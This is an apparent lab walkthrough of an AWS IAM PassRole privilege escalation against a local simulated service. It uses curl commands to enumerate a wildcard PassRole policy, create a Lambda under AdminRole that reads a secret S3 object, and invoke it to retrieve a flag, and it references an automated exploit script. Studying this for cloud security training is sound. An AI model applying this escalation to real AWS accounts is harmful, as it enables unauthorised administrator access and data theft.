# Walkthrough: AWS IAM PassRole Privilege Escalation

## Setup

```bash
docker compose up --build -d
```

Confirm the service is running:

```bash
curl -s -H "X-Access-Key: AKIAI-DEV-USER-KEY" http://localhost:8080/ | python3 -m json.tool
```

```json
{
  "Message": "Welcome, dev-user.",
  "Credentials": {"AccessKeyId": "AKIAI-DEV-USER-KEY"},
  "Endpoints": [
    "GET  /iam/get-user-policies",
    "GET  /iam/list-roles",
    "POST /lambda/create-function",
    "GET  /lambda/list-functions",
    "POST /lambda/invoke"
  ]
}
```

## Step 1: Enumerate permissions

```bash
curl -s -H "X-Access-Key: AKIAI-DEV-USER-KEY" \
  http://localhost:8080/iam/get-user-policies | python3 -m json.tool
```

The policy grants `iam:PassRole` with `Resource: arn:aws:iam::123456789012:role/*`. That wildcard is the vulnerability.

## Step 2: Find a high-privilege role

```bash
curl -s -H "X-Access-Key: AKIAI-DEV-USER-KEY" \
  http://localhost:8080/iam/list-roles | python3 -m json.tool
```

`AdminRole` has administrator access to all AWS services including S3.

## Step 3: Create Lambda with AdminRole

```bash
curl -s -X POST \
  -H "X-Access-Key: AKIAI-DEV-USER-KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "FunctionName": "privesc-function",
    "Role": "arn:aws:iam::123456789012:role/AdminRole",
    "Code": "import json\nimport boto3\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('"'"'s3'"'"')\n    obj = s3.get_object(Bucket='"'"'secret-bucket'"'"', Key='"'"'flag.txt'"'"')\n    return {'"'"'flag'"'"': obj['"'"'Body'"'"']}"
  }' \
  http://localhost:8080/lambda/create-function
```

```json
{
  "FunctionName": "privesc-function",
  "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:privesc-function",
  "Role": "arn:aws:iam::123456789012:role/AdminRole",
  "State": "Active"
}
```

## Step 4: Invoke the Lambda

```bash
curl -s -X POST \
  -H "X-Access-Key: AKIAI-DEV-USER-KEY" \
  -H "Content-Type: application/json" \
  -d '{"FunctionName": "privesc-function", "Payload": {}}' \
  http://localhost:8080/lambda/invoke
```

```json
{
  "StatusCode": 200,
  "Payload": {
    "flag": "POC{...}"
  }
}
```

## Automated

```bash
python3 exploit/exploit.py http://localhost:8080
```

## Teardown

```bash
docker compose down
```
